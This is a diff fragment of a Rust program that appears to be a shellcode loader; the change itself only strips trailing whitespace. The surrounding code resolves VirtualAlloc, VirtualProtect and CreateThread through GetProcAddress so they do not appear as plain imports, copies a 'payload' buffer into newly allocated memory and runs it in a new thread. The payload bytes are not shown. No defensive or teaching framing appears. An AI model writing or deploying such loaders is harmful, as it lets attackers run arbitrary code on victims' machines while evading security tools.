@@ -52,20 +52,20 @@ fn main() {
         let _pVirtualAlloc = GetProcAddress(GetModuleHandleA(sKernel32.as_ptr()), sVirtualAlloc.as_ptr()).unwrap();
         let pVirtualAlloc: VirtualAllocFn = std::mem::transmute(_pVirtualAlloc);
 
-        let payload_addr = 
+        let payload_addr =
         pVirtualAlloc(
             0 as *const c_void,
             payload.len(),
             MEM_COMMIT,
             PAGE_READWRITE);
 
-        if payload_addr.is_null() { 
+        if payload_addr.is_null() {
             println!("[-] Couldn't allocate memory to current proc.")
         }
 
         //copy payload
         std::ptr::copy(payload.as_ptr() as _, payload_addr, payload.len());
-        
+
         type VirtualProtectFn = unsafe extern "system" fn(*const c_void, usize, PAGE_PROTECTION_FLAGS, *mut PAGE_PROTECTION_FLAGS) -> *mut c_void;
         let _pVirtualProtect = GetProcAddress(GetModuleHandleA(sKernel32.as_ptr()), sVirtualProtect.as_ptr()).unwrap();
         let pVirtualProtect: VirtualProtectFn = std::mem::transmute(_pVirtualProtect);
@@ -93,15 +93,15 @@ fn main() {
         let h_thread = pCreateThread(
           null_mut(),
           0,
-          payload_fn, 
-          null_mut(), 
-          0, 
+          payload_fn,
+          null_mut(),
+          0,
           null_mut());
-        
+
         if h_thread == 0 {
             let error = GetLastError();
             println!("{}", error.to_string())
-        
+
         }
 
         WaitForSingleObject(h_thread, u32::MAX);
